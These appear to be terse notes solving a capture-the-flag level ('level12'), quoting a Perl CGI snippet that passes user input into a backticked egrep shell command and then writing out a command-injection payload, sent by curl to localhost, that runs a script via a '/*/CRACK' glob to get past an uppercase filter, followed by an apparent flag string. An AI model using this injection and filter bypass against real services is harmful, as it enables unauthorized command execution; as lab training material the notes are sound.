getfacl level12.pl

# localhost:4646

$xx = $_[0];

# Filter 1: Converts all lowercase to UPPERCASE
$xx =~ tr/a-z/A-Z/; 

# Filter 2: Deletes everything after the first whitespace
$xx =~ s/\s.*//;

@output = `egrep "^$xx" /tmp/xd 2>&1`;

echo "getflag > /tmp/flag12" > /tmp/CRACK

# Shell execute anything inside the bracket. 
$(...)
curl 'localhost:4646/?x=$(/*/CRACK)'

#g1qKMiRpXf53AWhDaU7FEkczr